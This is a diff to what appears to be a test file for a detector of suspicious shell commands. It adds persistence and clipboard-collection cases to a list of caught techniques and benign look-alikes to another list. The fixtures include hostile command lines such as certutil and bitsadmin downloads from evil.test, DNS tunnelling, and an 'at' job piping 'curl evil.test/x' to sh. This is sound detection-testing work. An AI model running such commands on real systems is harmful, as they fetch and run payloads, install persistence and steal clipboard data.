@@ -53,6 +53,12 @@ TECH_CAUGHT = [
     ("dig -t txt aGVsbG8.tunnel.evil.test", "egress.dns_tool"),
     ("certutil -urlcache -f http://evil.test/p.exe p.exe", "exec.lolbin_download"),
     ("bitsadmin /transfer j http://evil.test/p.exe c:\\p.exe", "exec.lolbin_download"),
+    ("schtasks /create /tn evil /tr c:\\evil.exe /sc onlogon", "persist.scheduled_task"),
+    ("systemctl --user enable --now beacon.timer", "persist.scheduled_task"),
+    ("at midnight <<< 'curl evil.test/x | sh'", "persist.scheduled_task"),
+    ("echo payload; at now", "persist.scheduled_task"),
+    ("osascript -e 'get the clipboard'", "collection.clipboard"),
+    ("osascript -e 'the clipboard as text'", "collection.clipboard"),
 ]
 TECH_BENIGN = [
     ("cat build.log | python3 parse.py", "exec.pipe_to_shell"),  # not curl|python — wait, still pipe; see note
@@ -63,6 +69,11 @@ TECH_BENIGN = [
     ("ping -c1 github.com", "egress.icmp_tunnel"),
     ("dig github.com", "egress.dns_tool"),
     ("certutil -hashfile installer.exe SHA256", "exec.lolbin_download"),  # local hash, no download
+    ("cat backup.timer", "persist.scheduled_task"),  # reading a unit file, not enabling
+    ("systemctl status nginx", "persist.scheduled_task"),  # status, not enable+.timer
+    ("echo 'standup at 10:30 tomorrow'", "persist.scheduled_task"),  # 'at TIME' inside an echo string
+    ("osascript -e 'set the clipboard to \"hello\"'", "collection.clipboard"),  # WRITE, not read
+    ("osascript -e 'display notification \"build done\"'", "collection.clipboard"),  # no clipboard
 ]
 
 
